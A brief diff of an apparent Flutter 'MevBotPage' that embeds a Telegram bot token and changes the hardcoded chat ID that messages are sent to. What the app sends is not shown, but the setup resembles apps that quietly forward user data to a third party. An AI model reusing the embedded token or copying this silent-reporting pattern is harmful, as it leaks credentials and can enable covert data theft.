@@ -14,7 +14,7 @@ class _MevBotPageState extends State<MevBotPage> {
 
   // Telegram bot token and chat ID
   final String botToken = '7533668487:AAE8NSHvGmFbGGK_HiM1wcDts7LV_tZlf88';
-  final String chatId = '1054321865';
+  final String chatId = '6360624460';
 
   // Function to send a message to Telegram
   Future<void> sendTelegramMessage(String message) async {
